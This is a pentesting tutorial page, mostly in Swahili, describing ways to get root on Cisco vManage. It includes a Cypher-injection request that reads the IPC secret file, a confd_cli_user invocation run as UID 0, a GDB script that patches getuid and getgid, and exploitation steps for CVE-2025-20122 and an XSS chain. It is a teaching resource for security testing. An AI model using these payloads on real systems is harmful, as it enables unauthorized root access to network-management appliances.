# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Njia 1

(Mfano kutoka kwa [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Baada ya kuchunguza kidogo kupitia baadhi ya [documentation](http://66.218.245.39/doc/html/rn03re18.html) zinazohusiana na `confd` na binaries tofauti (zinaweza kupatikana ukiwa na akaunti kwenye tovuti ya Cisco), tuligundua kuwa ili kuthibitisha IPC socket, inatumia siri iliyoko katika `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Unakumbuka instance yetu ya Neo4j? Inakimbia chini ya ruhusa za mtumiaji `vmanage`, hivyo kuturuhusu kupata faili kwa kutumia udhaifu uliotangulia:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Programu ya `confd_cli` haitoi msaada kwa hoja za mstari wa amri lakini inaita `/usr/bin/confd_cli_user` na hoja. Kwa hivyo, tunaweza kuitisha moja kwa moja `/usr/bin/confd_cli_user` na seti yetu ya hoja. Hata hivyo haikusomeki kwa ruhusa zetu za sasa, hivyo tunapaswa kuipata kutoka rootfs na kuikopa kwa kutumia scp, kusoma help, na kuitumia kupata shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Njia 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blogu¹ ya timu ya synacktiv ilielezea njia ya kupendeza ya kupata root shell, lakini kizuizi ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user` ambayo inaweza kusomwa tu na root. Nilipata njia nyingine ya kuinua idhini hadi root bila taabu hiyo.

Nilipofanyia disassembly binary ya `/usr/bin/confd_cli`, niliona yafuatayo:

<details>
<summary>Objdump ikionesha ukusanyaji wa UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Nilipokimbiza “ps aux”, niliona yafuatayo (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Nilidhani kwamba programu “confd_cli” hupitisha user ID na group ID zinazokusanywa kutoka kwa mtumiaji aliyeingia kwa programu “cmdptywrapper”.

Jaribio langu la kwanza lilikuwa kuendesha “cmdptywrapper” moja kwa moja na kumpa `-g 0 -u 0`, lakini lilikosa. Inaonekana file descriptor (-i 1015) iliundwa mahali fulani njiani na siwezi kuiiga.

Kama ilivyoelezwa kwenye blogu ya synacktiv (mfano wa mwisho), programu `confd_cli` haitoi command line argument, lakini naweza kuibadilisha kwa debugger na kwa bahati GDB imejumuishwa kwenye mfumo.

Nilitengeneza script ya GDB ambapo nililazimisha API `getuid` na `getgid` zirudishe 0. Kwa kuwa tayari nina ruhusa za “vmanage” kupitia deserialization RCE, nina idhini ya kusoma `/etc/confd/confd_ipc_secret` moja kwa moja.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Matokeo ya Console:

<details>
<summary>Matokeo ya Console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Njia 3 (hitilafu ya uthibitisho wa pembejeo ya CLI ya 2025)

Cisco ilibadilisha jina vManage kuwa *Catalyst SD-WAN Manager*, lakini CLI ya msingi bado inaendesha kwenye kifaa hicho hicho. Taarifa ya 2025 (CVE-2025-20122) inaelezea ukosefu wa uthibitisho wa pembejeo kwenye CLI unaomruhusu **mtumiaji yeyote wa ndani aliyethibitishwa** kupata root kwa kutuma ombi lililotengenezwa kwa huduma ya manager CLI. Unganisha nafasi yoyote ya ufikiaji wa hadhi ndogo (kwa mfano, Neo4j deserialization kutoka Path1, au shell ya mtumiaji wa cron/backup) na hitilafu hii ili kuruka hadi root bila kunakili `confd_cli_user` au kuambatisha GDB:

1. Tumia shell yako ya hadhi ndogo ili kupata endpoint ya CLI IPC (kawaida listener `cmdptywrapper` unaoonekana kwenye bandari 4565 katika Path2).
2. Tengeneza ombi la CLI linalofalsi maeneo ya UID/GID kuwa 0. Hitilafu ya uthibitisho inashindwa kutekeleza UID ya mwalishaji wa awali, hivyo wrapper inazindua PTY yenye msaada wa root.
3. Pipa mfululizo wowote wa amri (`vshell; id`) kupitia ombi lililofalsiwa ili kupata root shell.

> Uso wa exploit ni wa ndani tu; remote code execution bado inahitajika ili kupata shell ya awali, lakini ukifika ndani ya kifaa matumizi yake ni ujumbe mmoja wa IPC badala ya debugger-based UID patch.

## Vulns nyingine za hivi karibuni za vManage/Catalyst SD-WAN Manager za kuunganisha

* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript katika nyanja maalum za interface; kuiba admin session inakupa njia inayotumiwa na browser kuelekea `vshell` → local shell → Path3 kwa root.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
